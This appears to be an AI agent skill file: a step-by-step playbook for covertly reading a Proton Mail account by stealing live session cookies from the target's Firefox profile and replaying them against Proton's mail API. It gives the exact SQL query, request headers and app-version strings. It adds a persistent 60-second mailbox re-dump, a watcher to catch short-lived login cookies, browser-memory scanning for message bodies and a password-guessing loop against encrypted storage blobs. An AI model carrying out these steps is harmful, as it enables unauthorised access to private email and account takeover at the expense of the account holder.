---
name: proton-session-replay
description: Reuse a LIVE Proton session token captured from the target's browser
  cookies for read-only API access — list the mailbox via mail-api.proton.me DIRECT
  with the AUTH-<uid> cookie plus x-pm-uid/x-pm-appversion headers, no fork and no
  login. Includes the proven Proton web session model (memory-only mail sessions,
  3–8 s transient login cookies, server-side token survival, scope masks) and the
  dead-ends (fork 422, cross-session getLocalKey 401, offline ps-blob Argon2id).
  Use when a target has an active or just-used Proton web session and you need
  passive mailbox metadata/read access, or when deciding which Proton session
  artifacts (cookies, localStorage ps-blobs) are worth capturing and why.
purpose: Passive read-only Proton mailbox access via a live session token (mail-api DIRECT); proven session model + dead-ends
version: 1.0.0
requires: python3+stdlib (urllib, sqlite3) | for offline ps-blob attempts: argon2-cffi + cryptography (pip-installed, see references)
---

# Proton session replay (live-token read-only API access)

## When to use

- A Proton web session is (or very recently was) live in a browser on the target
  and you want mailbox LIST/metadata without any visible login action.
- You captured proton AUTH/REFRESH cookies and must decide what they are still
  worth (scope, lifetime, server-side survival) before spending them.
- You need the session model to plan a watcher: which cookie write carries mail
  scope, how long it lives, what survives cookie deletion.

## Workflow (proven end-to-end on session 2026-10-15-morpher)

1. **Capture the cookie pair from Firefox's cookies.sqlite** (copy DB + `-wal`,
   DROP any stale `-shm` — a stale shm copy killed a watcher with errno 22):
   `SELECT host, name, value FROM moz_cookies WHERE name LIKE 'AUTH-%' AND host LIKE '%proton%'`
   — name `AUTH-<UID>` gives both UID (strip the `AUTH-` prefix; 32-char
   lowercase alnum, e.g. `llk2…`) and value. Session source: live profile
   `3xzkegqp.default-release`, 128 plaintext cookies incl. live Proton
   AUTH/REFRESH JWTs (`loot\C12\Firefox\cookies-parsed.json`).
2. **Date the session before trusting it**: check `places.sqlite` timestamps for
   the user's last real Proton use. Captured-cookie replay of stale sessions
   fails 401 within hours (access tokens rotate; proven: tokens from a 10-06
   last-use were dead on 10-11).
3. **Hit the mail API DIRECT** (`scripts/mail-dump.py` — takes uid + value):
   `GET https://mail-api.proton.me/api/mail/v4/messages?Page=0&PageSize=30` with
   headers `Cookie: AUTH-<uid>=<val>`, `x-pm-uid: <uid>`,
   `x-pm-appversion: web-mail@5.0.135.9`, `Accept: application/json`,
   `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/157.0`.
   **KEY LEARNING (C10-18): the full-scope account-web session token works
   directly on mail-api — NO fork needed.** Proven result: mailbox LIST of 24–25
   messages (senders/dates/unread/IDs) → `loot\C10\mailbox.txt`.
4. **Get the appversion right**: current format is `web-mail@5.0.135.9` /
   `web-account@5.0.426.0`. Fetch live from the web app's JS bundles
   (`APP_VERSION=...` regex — `scripts/mail-api.py` does this); the legacy
   `Web_x` format now returns error 5002.
5. **Persist the hit**: write the live UID+token to a token file and re-dump on a
   timer (session: `persist-dumper.py`, mailbox.txt re-dumped every 60 s for
   12 h; dump #1 → 200, Total=24). Token validity = server-side session
   lifetime — it SURVIVES the browser deleting the cookie (C10-13, C10-20).
6. **Bodies**: message bodies are PGP-encrypted (`-----BEGIN PGP MESSAGE-----`);
   API access alone does NOT decrypt them. For bodies of messages the user
   OPENED, scan live browser memory (see `browser-memory-scan` skill). Full
   decryption of all bodies requires keyPassword = account password — see
   dead-ends below and `references/proton-session-model.md`.

## Gotchas (proven)

- **Mail session is memory-only**: the forked mail session never writes a cookie;
  persistence is the localStorage `ps-1` blob only. A cloned-profile replay
  (cookies+storage+ps-1 injected) hits the "Proton Mail: Sign-in" wall — a clone
  cannot resume a memory-only session (C10-09).
- **Transient login cookie lives 3–8 s**: the login-flow AUTH cookie is deleted
  by the browser after the SSO redirect (C10-12). Only a fast watcher (~3 s poll
  of the live cookies DB, instant snapshot on any new/changed proton cookie —
  the `watch-proton.py` v5 pattern, REFERENCE in the session drop) catches one.
- **Pre-2FA scope is locked-equivalent**: bitmask decode of a captured
  login-session token granted [loggedin,nondelinquent,vpn,drive,docs,pass,
  verified,lumo,meet] — NOT mail/self/user; cannot be escalated to mail without
  TOTP (C10-13).
- **2FA upgrade does NOT rotate the AUTH cookie** (C10-14): the post-2FA token
  exists only inside the running browser (in-browser refresh); the captured
  refresh token was already consumed (400 Invalid refresh token). Only lever for
  a mail-scoped token passively: catch a cookie write that already carries mail
  scope (persistent login), or a live full-scope login session's cookie.
- **Winning recipe (C10-17)**: watcher caught the 18:25 login (UID `llk2…`);
  a dedicated prober polled `/users` until scope flipped full (~18:32); that
  cookie then read mail-api directly. Poll cadence ~0.25 s on trigger.
- **`x-pm-appversion` format changed**: legacy `Web_x` → 5002; use
  `web-<app>@x.y.z.w` scraped from the app's JS bundles.
- **Never drive the live Firefox profile**; clone it first (robocopy minus
  cache2/shader/gmp/telemetry) — replay in the clone only.
- **geckodriver needs zero Python deps** if you do drive a clone: pure urllib
  against `http://127.0.0.1:PORT/session` (POST caps → id; /url;
  /execute/sync; /screenshot; DELETE) — session proven pattern.

## Dead-ends (do not re-walk)

1. **Fork push → 422 Invalid selector** (probed by `probe-scopes.py`-style POST
   to `/api/core/v4/auth/v4/sessions/forks`): creating a mail fork from a
   captured account session fails; use DIRECT API with the full-scope token
   (workflow step 3).
2. **getLocalKey cross-session → 401** (`scripts/keypassword-try.py` documents
   every header variant): `GET /api/auth/v4/sessions/local/key` returns
   ClientKey only with the session's OWN live auth (own-auth → 200 ClientKey;
   cross-UID → 401, C10-21).
3. **Offline ps-blob Argon2id**: account `ps-*` blob payloadType=offline is
   encrypted with Argon2id(password, offlineKeySalt), params
   {passes:1, parallelism:4, memoryExponent:19, tagLength:32}; a 14-candidate
   loop matched nothing — account password unknown (C10-21/22). Mail `ps-1`
   payloadType=default wraps {keyPassword} with AES-GCM(key=ClientKey), and
   ClientKey is server-side per session. Extract blobs with
   `scripts/ps-dump.py` (localStorage `ls\data.sqlite`, key LIKE 'ps-%').
4. **Stale REFRESH replay → 401** consumed/revoked (C10-10).

## Environment (tested)

| component | version / value |
|---|---|
| Windows | 11 build 26200 (NT 10.0.26200), medium integrity (NOT elevated) |
| Browser | Firefox 157.0.1, profile 3xzkegqp.default-release, Proton v5 web clients |
| appversion | web-mail@5.0.135.9, web-account@5.0.426.0 (live-scraped) |
| Python | portable CPython 3.13 (stdlib only for the API path) |
| Offline-blob attempts | argon2-cffi 25.1.0 + cryptography 50.0.2 pip-installed into session pylibs (portablepy pip recipe R-01) |

## Provenance

- Source session: `sessions/2026-10-15-morpher` (DESKTOP-0563647\morpher,
  operator-owned declared-test machine), excavation 2026-10-11.
- Evidence: `scripts/mail-api.py`, `mail-dump.py`, `ps-dump.py`,
  `keypassword-try.py` (byte-identical copies in `scripts/`); findings C10-05 …
  C10-24 in `findings.jsonl`; HANDOFF.md §3.2 + §4.1–4.3;
  `loot\C10\mailbox.txt`, `mail-token.log`, `webread.log`, `ps-blobs\`
  (path pointers; loot kept operator-side).
- Session-material note: cookie/token VALUES are unredacted operator-side loot
  only — never written into this skill; UIDs are masked to ≤6 chars + length.

## Changelog

- 1.0.0 — 2026-10-16 — initial release, proven end-to-end on session
  2026-10-15-morpher (passive mailbox LIST via live full-scope token).

